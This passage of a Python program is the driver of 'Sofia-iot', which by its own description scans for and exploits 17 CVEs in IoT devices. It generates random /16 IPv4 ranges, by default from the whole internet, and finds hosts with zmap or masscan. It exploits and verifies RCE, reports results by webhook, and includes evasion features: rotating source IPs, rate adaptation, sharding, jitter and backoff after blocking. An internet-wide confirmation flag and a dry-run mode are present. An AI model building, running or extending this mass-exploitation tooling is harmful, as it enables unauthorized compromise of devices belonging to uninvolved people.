    batch_total = max(1, (len(ranges) - done0 + batch_size - 1) // batch_size)
    batch_index = 0
    all_findings, all_fingerprints = [], []
    agg_counts = {}
    confirmed_all = []
    ctl = rate_limiter.get_controller()      # bộ điều tiết pps thích ứng

    while True:
        batch = checkpoint.next_batch(state, batch_size, retry_failed=args.retry_failed)
        if not batch:
            break
        batch_index += 1
        done, total = checkpoint.progress(state)
        target_generator.SCAN_RANGES = batch

        if args.notify_progress:
            webhook.notify_phase("batch-start",
                                 "Bắt đầu batch %d/%d: %d dải /16 — %s"
                                 % (batch_index, batch_total, len(batch),
                                    ", ".join(batch)),
                                 {"batch_index": batch_index, "batch_total": batch_total,
                                  "done": done, "total": total})

        t_batch = time.time()
        log.info("=== BATCH %d/%d: %d dải /16 (%s) ===",
                 batch_index, batch_total, len(batch), ", ".join(batch))
        targets = target_generator.generate()
        if not targets:
            log.warning("Batch %d: discovery không tìm thấy mục tiêu nào", batch_index)
            ctl.record_zero_batch("batch %d: 0 target" % batch_index)
            checkpoint.mark_done(state, batch)          # dải đã quét xong (0 IP live)
            checkpoint.save_state(state, args.state)
            continue

        ctl.record_success()                        # batch sạch → tăng pps dần
        findings, fingerprints, stats, confirmed = run_pipeline(
            targets, tag="batch_%04d" % batch_index)
        all_findings.extend(findings)
        all_fingerprints.extend(fingerprints)
        confirmed_all.extend(confirmed)
        for k, v in stats["by_status"].items():
            agg_counts[k] = agg_counts.get(k, 0) + v

        checkpoint.mark_done(state, batch, stats={
            "total_findings": len(findings),
            "rce_confirmed": len(confirmed),
        })
        checkpoint.save_state(state, args.state)

        if args.notify_progress:
            webhook.notify_phase("batch-done",
                                 "Xong batch %d/%d: %d target, %d finding, %d RCE — %.0fs"
                                 % (batch_index, batch_total, len(targets),
                                    len(findings), len(confirmed), time.time() - t_batch),
                                 {"batch_index": batch_index, "batch_total": batch_total,
                                  "done": len(state.get("completed", [])), "total": total,
                                  "findings": len(findings), "rce": len(confirmed)})

        if checkpoint.pending_ranges(state, retry_failed=args.retry_failed):
            politeness_sleep()

    # Gộp toàn bộ batch → dedup toàn pipeline theo (host, cve, port) rồi
    # ghi findings_all.json + summary cuối + report.html/report.csv (P1 — 1.5).
    # Host có thể trùng qua nhiều batch (dải /16 chồng lấn hoặc lặp khi resume),
    # nên dedup ở đây là cần thiết để report không phình số liệu.
    all_findings = report.dedup_findings(all_findings)
    agg_counts = {}
    for f in all_findings:
        agg_counts[f["status"]] = agg_counts.get(f["status"], 0) + 1
    confirmed_all = [f for f in all_findings if f["status"] == verifier.RCE_CONFIRMED]
    done, total = checkpoint.progress(state)
    agg_stats = {
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "mode": "auto-gen /16",
        "anti_block": rate_limiter.get_controller().snapshot(),
        "ranges_done": done,
        "ranges_total": total,
        "batches_done": batch_index,
        "total_findings": len(all_findings),
        "by_status": agg_counts,
        "rce_confirmed": [
            {"cve": f["cve"], "host": f["host"], "port": f["port"],
             "evidence": f.get("evidence", "")} for f in confirmed_all
        ],
    }
    os.makedirs(RESULTS_DIR, exist_ok=True)
    with open(os.path.join(RESULTS_DIR, "findings_all.json"), "w",
              encoding="utf-8") as fh:
        json.dump(all_findings, fh, ensure_ascii=False, indent=2)
    with open(os.path.join(RESULTS_DIR, "summary_all.json"), "w",
              encoding="utf-8") as fh:
        json.dump(agg_stats, fh, ensure_ascii=False, indent=2)
    log.info("Đã ghi findings_all.json (%d finding, dedup) + summary_all.json",
             len(all_findings))
    # P1 — 1.5: sinh report.html + report.csv (severity CVSS + dedup)
    try:
        report.generate_report(
            all_findings,
            extra_meta={"source": os.path.join(RESULTS_DIR, "findings_all.json"),
                        "mode": agg_stats.get("mode", ""),
                        "ranges_done": "%s/%s" % (done, total)})
    except Exception as exc:
        log.warning("Không sinh được report HTML/CSV: %r", exc)
    return all_findings, all_fingerprints, agg_stats, confirmed_all


# ── Guardrail P0 — 0.1 (fail-closed internet-wide) ─────────────────────
def estimate_plan_hosts(ranges):
    """Tổng số địa chỉ IP mà kế hoạch sẽ quét (tổng num_addresses từng dải)."""
    total = 0
    for r in ranges:
        try:
            total += ipaddress.ip_network(r, strict=False).num_addresses
        except ValueError:
            total += 1
    return total


def print_plan(args, ranges, plan_hosts, use_auto, gen_key):
    """In kế hoạch quét rồi thoát (--dry-run) — không bắn bất kỳ request nào.

    Hiển thị: nguồn dải, số dải / tổng host dự kiến, engine, cổng, blacklist
    áp dụng, và lời nhắc --confirm-internet-wide nếu vượt ngưỡng.
    """
    blk = target_generator.BLACKLIST_FILE
    n_blk = 0
    if blk and os.path.exists(blk):
        with open(blk, encoding="utf-8", errors="ignore") as fh:
            n_blk = sum(1 for ln in fh if ln.strip() and not ln.lstrip().startswith("#"))
    if gen_key.get("random_range"):
        src = "dải /%d NGẪU NHIÊN %s" % (RANDOM_RANGE_PREFIX, gen_key["random_range"])
    elif use_auto:
        src = "auto-gen /%d từ %s" % (gen_key.get("split_to"), gen_key.get("cidr"))
    else:
        src = "khai tay"
    print("=" * 66)
    print("Sofia-iot — DRY-RUN: kế hoạch quét (không có request nào được gửi)")
    print("=" * 66)
    print("Nguồn dải        : %s" % src)
    print("Số dải           : %d" % len(ranges))
    print("Host dự kiến     : %d" % plan_hosts)
    scan_out = (getattr(target_generator, "ZMAP_SCAN_FILE", "zmap_scan.txt")
                if target_generator.ENGINE == "zmap"
                else getattr(target_generator, "MASSCAN_SCAN_FILE", "mass_scan.txt"))
    print("Engine discovery : %s (cổng %s) → %s" % (
        target_generator.ENGINE,
        ",".join(map(str, getattr(target_generator, "SCAN_PORTS", [80]))), scan_out))
    print("Blacklist áp dụng: %s (%d dòng)" % (blk, n_blk))
    print("Tham số khác     : batch=%d, max_chunks=%s, seed=%s, shuffle=%s" % (
        args.batch or BATCH_SIZE, getattr(args, "max_chunks", None) or 0,
        gen_key.get("seed"), gen_key.get("shuffle")))
    if plan_hosts > INTERNET_WIDE_HOSTS:
        print("-" * 66)
        print("CẢNH BÁO: kế hoạch vượt ngưỡng internet-wide (%d host)." % INTERNET_WIDE_HOSTS)
        print("Để chạy thật, phải thêm: --confirm-internet-wide")
    print("=" * 66)


def guard_internet_wide(args, plan_hosts):
    """
    Fail-closed: nếu kế hoạch vượt ngưỡng INTERNET_WIDE_HOSTS mà không có
    --confirm-internet-wide → trả về mã lỗi 2 (dừng, không quét).
    """
    if plan_hosts > INTERNET_WIDE_HOSTS and not args.confirm_internet_wide:
        log.error(
            "Kế hoạch quét %d host vượt ngưỡng internet-wide (%d) — bắt buộc "
            "--confirm-internet-wide để chạy. --dry-run để xem kế hoạch trước.",
            plan_hosts, INTERNET_WIDE_HOSTS)
        return False
    return True


# ── Chế độ --scan-file: nạp kết quả scan có sẵn (không quét lại) ────────
def _run_scan_file_mode(args, t0):
    """
    Nạp zmap_scan.txt/mass_scan.txt (hoặc file chỉ định) → chọn CVE theo cổng →
    khai thác/verify. KHÔNG chạy zmap/masscan, KHÔNG quét mới (nên bỏ qua
    guardrail internet-wide). Trả về mã thoát: 0 = OK, 2 = lỗi/không có mục tiêu.
    """
    files = target_generator.resolve_scan_files(target_generator.ENGINE, args.scan_file)
    if not files:
        log.error("--scan-file: không có file scan nào chứa dữ liệu "
                  "(zmap_scan.txt/mass_scan.txt rỗng hoặc không tồn tại)")
        return 2
    log.info("Chế độ scan-file: nạp %d file — %s", len(files), ", ".join(files))

    only = [c.strip() for c in args.only_cves.split(",") if c.strip()] \
        if args.only_cves else None
    max_per_host = (args.max_cves_per_host if args.max_cves_per_host is not None
                    else MAX_CVES_PER_HOST)

    targets = target_generator.load_scan_targets(
        files, only=only, max_per_host=max_per_host)
    if not targets:
        log.error("--scan-file: các file scan không có dòng 'IP:Port' hợp lệ")
        return 2

    if args.dry_run:
        print("=" * 66)
        print("Sofia-iot — DRY-RUN: nạp kết quả scan có sẵn (không request nào được gửi)")
        print("=" * 66)
        print("File scan     : %s" % ", ".join(files))
        print("Số mục tiêu   : %d (limit=%d)" % (len(targets), args.limit))
        print("Lọc CVE       : only=%s, max/host=%s" % (
            ",".join(only) if only else "—", max_per_host or "không giới hạn"))
        print("-" * 66)
        ordered = sorted(targets, key=lambda x: ipaddress.ip_address(x))
        for ip in ordered[:50]:
            meta = targets[ip]
            cves = list(meta.get("cves") or []) + list(meta.get("port_cves") or [])
            print("  %-15s ports=%-16s CVE=%s" % (
                ip, ",".join(map(str, meta["ports"])), ",".join(cves) or "—"))
        if len(ordered) > 50:
            print("  ... (%d mục tiêu khác)" % (len(ordered) - 50))
        print("=" * 66)
        return 0

    if args.limit and len(targets) > args.limit:
        log.warning("Giới hạn %d mục tiêu (đang có %d)", args.limit, len(targets))
        targets = dict(sorted(targets.items(),
                              key=lambda kv: ipaddress.ip_address(kv[0]))[:args.limit])

    findings, _fps, stats, confirmed = run_pipeline(targets, tag="scan_file")
    if args.notify_progress:
        webhook.notify_summary(stats)
    print_summary(stats, confirmed)
    if findings:
        report.generate_report(
            findings, extra_meta={"source": ", ".join(files), "mode": "scan-file"})
    log.info("Pipeline (scan-file) hoàn tất trong %.1fs — %d mục tiêu, %d finding",
             time.time() - t0, len(targets), len(findings))
    return 0


# ── CLI ─────────────────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(
        description="Sofia-iot — pipeline quét & khai thác lỗ hổng thiết bị IoT "
                    "(17 CVE) — auto-generate dải IPv4 /16 + webhook")
    # Chế độ cũ
    p.add_argument("--no-discover", action="store_true",
                   help="Bỏ qua zmap/masscan — đọc file targets (mặc định targets.txt)")
    p.add_argument("--targets", default=DEFAULT_TARGETS_FILE,
                   help="File danh sách mục tiêu thay thế (dùng với --no-discover)")
    p.add_argument("--limit", type=int, default=MAX_TARGETS,
                   help="Giới hạn số mục tiêu xử lý MỖI BATCH (mặc định %d)" % MAX_TARGETS)
    # Nạp kết quả scan có sẵn (không quét lại) + bộ lọc CVE
    p.add_argument("--scan-file", nargs="?", const="auto", default=None,
                   metavar="FILES",
                   help="Nạp kết quả scan CÓ SẴN thay vì quét lại (không bắn zmap/masscan). "
                        "Bật không kèm giá trị → 'auto': gộp zmap_scan.txt + mass_scan.txt "
                        "(bỏ file rỗng). Cũng nhận 'a.txt,b.txt' (danh sách file) hoặc 1 đường dẫn. "
                        "File nhận dạng: 'IP:Port', 'IP' trần (zmap raw) và "
                        "'open tcp <p> <ip>' (masscan -oL).")
    p.add_argument("--only-cves", default=None,
                   help="Chỉ khai thác các CVE này (VD 'CVE-2021-36260,CVE-2024-45414'). "
                        "Áp dụng cho cả --scan-file lẫn discovery.")
    p.add_argument("--max-cves-per-host", type=int, default=None,
                   help="Giới hạn N CVE điểm CVSS cao nhất mỗi host (0 = không giới hạn; "
                        "mặc định config.MAX_CVES_PER_HOST=%d)" % MAX_CVES_PER_HOST)
    p.add_argument("--ports", default=None,
                   help="Override SCAN_PORTS (VD '80,8080,37215')")
    # ── Chống block khi quét dải lớn (rate_limiter) ────────────────────
    p.add_argument("--rate", type=int, default=None,
                   help="pps khởi điểm cho zmap -r / masscan --rate (override "
                        "SCAN_RATE_START, mặc định %d)" % SCAN_RATE_START)
    p.add_argument("--rate-min", type=int, default=None,
                   help="pps tối thiểu khi điều tiết thích ứng (mặc định %d)" % SCAN_RATE_MIN)
    p.add_argument("--rate-max", type=int, default=None,
                   help="pps tối đa khi điều tiết thích ứng (mặc định %d)" % SCAN_RATE_MAX)
    p.add_argument("--no-rate-adaptive", action="store_true",
                   help="Tắt điều tiết pps thích ứng (dùng pps cố định)")
    p.add_argument("--source-ips", default=None,
                   help="Danh sách IP nguồn xoay vòng, phân tách dấu phẩy "
                        "(zmap -S / masscan --source-ip)")
    p.add_argument("--source-port", default=None,
                   help="Cổng nguồn (zmap -s; masscan --source-port cần cổng/dải căn 2^k)")
    p.add_argument("--shard", default=None, metavar="x/N",
                   help="Chia shard để nhiều máy cùng quét một kế hoạch (VD 1/4)")
    p.add_argument("--scan-seed", type=int, default=None,
                   help="Seed cho shard/rate_limiter (override SCAN_SEED; 0 = ngẫu nhiên)")
    p.add_argument("--no-port-shuffle", action="store_true",
                   help="Không xáo thứ tự cổng mỗi lượt quét")
    p.add_argument("--port-jitter", type=float, default=None,
                   help="Nghỉ ngẫu nhiên tối đa N giây giữa 2 lượt cổng (mặc định %.1f)"
                        % SCAN_PORT_JITTER)
    p.add_argument("--min-hitrate", type=float, default=None,
                   help="zmap --min-hitrate: tự dừng cổng khi hitrate thấp (anti-block)")
    p.add_argument("--block-zero-batches", type=int, default=None,
                   help="Số batch 0 kết quả liên tiếp coi là bị chặn (mặc định %d)"
                        % SCAN_BLOCK_ZERO_BATCHES)
    p.add_argument("--backoff-min", type=float, default=None,
                   help="Cooldown tối thiểu (giây) sau dấu hiệu bị chặn (mặc định %.0f)"
                        % SCAN_BLOCK_BACKOFF_MIN)
    p.add_argument("--backoff-max", type=float, default=None,
                   help="Cooldown tối đa (giây) sau dấu hiệu bị chặn (mặc định %.0f)"
                        % SCAN_BLOCK_BACKOFF_MAX)
    p.add_argument("--engines", dest="engines", choices=["zmap", "masscan"],
                   default=None,
                   help="Engine tìm cổng: zmap (mặc định — tự sinh dải /16 ngẫu nhiên, "
                        "quét cổng bằng zmap → zmap_scan.txt) hoặc masscan (tự sinh dải "
                        "/16 ngẫu nhiên, quét cổng bằng masscan → mass_scan.txt). "
                        "Ghi đè config.DISCOVER_ENGINE.")
    # Dải quét: khai tay hoặc tự sinh
    p.add_argument("--scan-range", default=None,
                   help="Dải CIDR khai tay (VD '192.0.2.0/24' hoặc '10.0.0.0/8,192.0.2.0/24'). "
                        "Nếu để trống + AUTO_GEN_RANGES → tự sinh dải /16.")
    p.add_argument("--gen-ranges", action="store_true",
                   help="Bật auto-generate dải IPv4 /16 (kể cả khi --scan-range không dùng)")
    p.add_argument("--gen-cidr", default=None,
                   help="Dải gốc để chia (override AUTO_GEN_CIDR, VD '0.0.0.0/0')")
    p.add_argument("--split-to", type=int, default=None,
                   help="Chia chunk /N (override AUTO_GEN_SPLIT_TO, mặc định 16)")
    p.add_argument("--gen-seed", type=int, default=None,
                   help="Seed xáo thứ tự dải (override AUTO_GEN_SEED; 0 = ngẫu nhiên)")
    p.add_argument("--no-shuffle", action="store_true",
                   help="Không xáo thứ tự dải /16 (quét tuần tự từ đầu)")
    p.add_argument("--max-chunks", type=int, default=None,
                   help="Giới hạn số dải /16 sinh ra (0 = tất cả; VD 8 = test nhanh)")
    p.add_argument("--force-ranges", action="store_true",
                   help="Sinh lại dải /16 (bỏ qua cache ranges.json)")
    # Guardrail P0 — 0.1
    p.add_argument("--dry-run", action="store_true",
                   help="In kế hoạch quét (dải → số host → blacklist) rồi thoát, "
                        "không bắn bất kỳ request nào")
    p.add_argument("--confirm-internet-wide", action="store_true",
                   help="Xác nhận CHỦ ĐÍCH quét khi kế hoạch vượt ngưỡng "
                        "INTERNET_WIDE_HOSTS (mặc định ~/8). Cần thiết cho "
                        "AUTO_GEN_CIDR=0.0.0.0/0 mặc định.")
    # Batch + resume
    p.add_argument("--batch", type=int, default=None,
                   help="Số dải /16 mỗi batch (override BATCH_SIZE, mặc định %d)" % BATCH_SIZE)
    p.add_argument("--state", default=STATE_FILE,
                   help="File checkpoint/resume (mặc định %s)" % STATE_FILE)
    p.add_argument("--no-resume", action="store_true",
                   help="Quét lại từ đầu (bỏ qua completed trong state)")
    p.add_argument("--retry-failed", action="store_true",
                   help="Đưa các dải bị lỗi (failed) quay lại hàng đợi")
    # Webhook
    p.add_argument("--webhook", default=None,
                   help="Override WEBHOOK_URL (hoặc dùng env SOFIA_WEBHOOK_URL)")
    p.add_argument("--notify-all", action="store_true",
                   help="Gửi webhook cả trường hợp không xác nhận được RCE")
    p.add_argument("--notify-progress", action="store_true",
                   help="Gửi webhook tiến độ batch (bắt đầu/hoàn tất/summary)")
    p.add_argument("--no-notify-progress", action="store_true",
                   help="Tắt webhook tiến độ batch")
    # Khác
    p.add_argument("--allow-private", action="store_true",
                   help="Không lọc IP riêng (dùng khi test lab nội bộ)")
    p.add_argument("-v", "--verbose", action="store_true", help="Log chi tiết (DEBUG)")
    return p.parse_args()


def main():
    args = parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s %(levelname)-7s %(name)s | %(message)s",
    )

    if args.ports:
        ports = [int(x) for x in args.ports.split(",") if x.strip()]
        target_generator.SCAN_PORTS = ports
    if args.engines:
        target_generator.set_engine(args.engines)
        log.info("Engine discovery từ CLI --engines: %s", target_generator.ENGINE)
    if args.scan_range:
        target_generator.SCAN_RANGES = [x.strip() for x in args.scan_range.split(",") if x.strip()]
        log.info("Dải quét khai tay: %s", target_generator.SCAN_RANGES)
    if args.allow_private:
        target_generator.ALLOW_PRIVATE = True
    # Cấu hình lớp chống block (rate/source/shard/jitter) — ghi đè config.
    target_generator.apply_scan_options(
        adaptive=False if args.no_rate_adaptive else None,
        rate=args.rate, rate_min=args.rate_min, rate_max=args.rate_max,
        source_ips=(args.source_ips.split(",") if args.source_ips else None),
        source_port=args.source_port, shard=args.shard, seed=args.scan_seed,
        port_order_random=False if args.no_port_shuffle else None,
        port_jitter=args.port_jitter, min_hitrate=args.min_hitrate,
        zero_batches=args.block_zero_batches,
        backoff_min=args.backoff_min, backoff_max=args.backoff_max)
    if args.webhook:
        webhook.WEBHOOK_URL = args.webhook
    if args.notify_all:
        webhook.NOTIFY_ALL = True
    notify_progress = (NOTIFY_PROGRESS and not args.no_notify_progress) \
        or args.notify_progress
    args.notify_progress = notify_progress

    t0 = time.time()

    # Bộ lọc CVE dùng chung (--only-cves / --max-cves-per-host) cho cả hai chế độ.
    target_generator.set_cve_filters(
        only=(args.only_cves.split(",") if args.only_cves else None),
        max_per_host=args.max_cves_per_host)

    # ── Chế độ --scan-file: nạp kết quả scan có sẵn (ưu tiên cao nhất) ──
    if args.scan_file is not None:
        return _run_scan_file_mode(args, t0)

    # ── Giai đoạn 0: nguồn mục tiêu ────────────────────────────────────
    # Guardrail P0 — 0.1: --dry-run không bắn bất kỳ request nào.
    if args.dry_run and args.no_discover:
        targets = load_targets_file(args.targets)
        print("=" * 66)
        print("Sofia-iot — DRY-RUN: targets.txt (không có request nào được gửi)")
        print("=" * 66)
        print("File targets   : %s" % args.targets)
        print("Số mục tiêu    : %d (limit=%d)" % (len(targets), args.limit))
        print("=" * 66)
        return 0

    # Chế độ cũ: --no-discover → đọc targets.txt (không dùng zmap, không batch)
    if args.no_discover:
        targets = load_targets_file(args.targets)
        if args.limit and len(targets) > args.limit:
            log.warning("Giới hạn %d mục tiêu (đang có %d)", args.limit, len(targets))
            targets = dict(list(targets.items())[:args.limit])
        findings, _fps, stats, confirmed = run_pipeline(targets, tag="manual")
        if args.notify_progress:
            webhook.notify_summary(stats)
        print_summary(stats, confirmed)
        if findings:
            report.generate_report(
                findings, extra_meta={"source": args.targets, "mode": "targets.txt"})
        log.info("Pipeline hoàn tất trong %.1fs — %d mục tiêu, %d finding",
                 time.time() - t0, len(targets), len(findings))
        return 0

    # ── Chế độ discovery: dải khai tay HOẶC tự sinh /16 ───────────────
    gen_key = {}
    ranges = []
    manual = bool(target_generator.SCAN_RANGES)
    use_auto = (not manual and DISCOVER_MODE) or args.gen_ranges

    if use_auto and RANDOM_RANGE_MODE and args.max_chunks is None:
        # Mặc định: engine tự sinh 1 dải /16 NGẪU NHIÊN (zmap → zmap_scan.txt,
        # masscan → mass_scan.txt). Tắt bằng RANDOM_RANGE_MODE=False hoặc --max-chunks.
        seed = args.gen_seed if args.gen_seed is not None else RANDOM_RANGE_SEED
        rng = target_generator.generate_random_range(
            prefix=args.split_to or RANDOM_RANGE_PREFIX, seed=seed)
        if not rng:
            log.error("Không sinh được dải ngẫu nhiên — dừng (fail-closed).")
            return 2
        ranges = [rng]
        gen_key = {"random_range": rng, "engine": target_generator.ENGINE}
        log.info("Auto random dải: %s (engine=%s, seed=%s)",
                 rng, target_generator.ENGINE, seed)
    elif use_auto:
        split_to = args.split_to or AUTO_GEN_SPLIT_TO
        seed = args.gen_seed if args.gen_seed is not None else AUTO_GEN_SEED
        shuffle = not args.no_shuffle and AUTO_GEN_SHUFFLE
        max_chunks = args.max_chunks if args.max_chunks is not None else AUTO_GEN_MAX_CHUNKS
        cidr = args.gen_cidr or AUTO_GEN_CIDR
        gen_key = {"cidr": cidr, "split_to": split_to, "shuffle": shuffle,
                   "seed": seed, "max_chunks": max_chunks,
                   "engine": target_generator.ENGINE}
        log.info("Auto-generate dải IPv4: %s → /%d (shuffle=%s seed=%d max_chunks=%d)",
                 cidr, split_to, shuffle, seed, max_chunks)
        ranges = target_generator.generate_ipv4_ranges(
            cidr=cidr, split_to=split_to, shuffle=shuffle, seed=seed,
            max_chunks=max_chunks, force=args.force_ranges)
        if not ranges:
            log.error("Không sinh được dải /%d nào từ %s — dừng (fail-closed).",
                      split_to, cidr)
            return 2
        log.info("Tổng %d dải /%d trong hàng đợi quét", len(ranges), split_to)
    elif manual:
        ranges = list(target_generator.SCAN_RANGES)
        gen_key = {"manual": ",".join(sorted(ranges)),
                  "engine": target_generator.ENGINE}
        log.info("Chế độ dải khai tay: %d dải — %s", len(ranges), ", ".join(ranges))
    else:
        log.error("Không có dải quét nào: dùng --scan-range <CIDR> hoặc bật "
                  "AUTO_GEN_RANGES (--gen-ranges). Dừng (fail-closed).")
        return 2

    # ── Guardrail P0 — 0.1: dry-run in kế hoạch; quét vượt ngưỡng phải confirm ──
    plan_hosts = estimate_plan_hosts(ranges)
    if args.dry_run:
        print_plan(args, ranges, plan_hosts, use_auto, gen_key)
        return 0
    if not guard_internet_wide(args, plan_hosts):
        return 2

    # Chạy vòng lặp batch (có checkpoint/resume + webhook tiến độ)
    all_findings, _all_fps, agg_stats, confirmed_all = run_range_batches(
        ranges, gen_key, args)

    if args.notify_progress:
        webhook.notify_summary(agg_stats)

    print_summary(agg_stats, confirmed_all)
    log.info("Pipeline hoàn tất trong %.1fs — %d dải /16, %d finding tổng cộng",
             time.time() - t0, len(ranges), len(all_findings))
    return 0


if __name__ == "__main__":
    sys.exit(main())










